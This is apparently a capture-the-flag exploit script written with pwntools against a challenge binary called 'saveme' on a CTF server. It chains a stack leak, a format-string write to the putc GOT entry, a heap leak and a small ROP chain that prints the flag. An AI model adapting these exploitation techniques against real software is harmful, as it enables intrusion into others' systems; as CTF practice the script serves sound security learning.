#!/usr/bin/env python3

from pwn import *

elf = ELF('./saveme', checksec = False)
libc = ELF('./libc.so.6', checksec = False)
context.clear(arch = 'amd64')

def start():
    gs = '''
        b *0x40151D
    '''
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        # nc challs.ctf.sekai.team 4001
        return remote('challs.ctf.sekai.team', 4001)
    return process(elf.path)

def get_gift():
    io.recvuntil(b'Here is your gift: ')
    return int(io.recvuntil(b' ', drop = True), base = 16)

def select_option(option):
    io.sendlineafter(b'Your option: ', str(option).encode())

def leave_note(note):
    io.sendlineafter(b'Please leave note for the next person: ', note)

io = start()

# target = 0x4014E8
# putc = 0x4010e6

stack_leak = get_gift()
success(f'stack leak @ 0x{stack_leak:02x}')
leak_heap_from_stack = stack_leak - 0xd0
stack_frame_rip = stack_leak + 0x68

read_ret = stack_leak - 0x20
read_rdi = stack_leak + 0x50

select_option(option = 2)

read_ret_delta = (read_ret & 0xffff) - 5053 - 4
assert(read_ret_delta > 0)

padded_delta = str(read_ret_delta).rjust(4, '0')

fmt_note = f'%5053c%13$hnAAAA%{padded_delta}c%14$hnBBB%15$sCC'.encode() + p64(elf.got.putc) + p64(read_rdi) + p64(leak_heap_from_stack)
info(f'Sending fmt note: '.encode() + fmt_note)

leave_note(note = fmt_note)

io.recvuntil(b'BBB')
heap_leak = u64(io.recvuntil(b'CC', drop = True).ljust(8, b'\x00'))
success(f'heap leak @ 0x{heap_leak:02x}')

flag_heap_addr = heap_leak - 0xc00

# Gadgets

# 0x00000000004015bb: pop rdi; ret;
pop_rdi_ret = 0x4015bb

ropchain = fit({
    0x0: p64(pop_rdi_ret),
    0x8: p64(flag_heap_addr),
    0x10: p64(elf.sym.puts),
    0x18: p64(0xdeadbeef)
})

io.sendline(ropchain)

io.interactive()
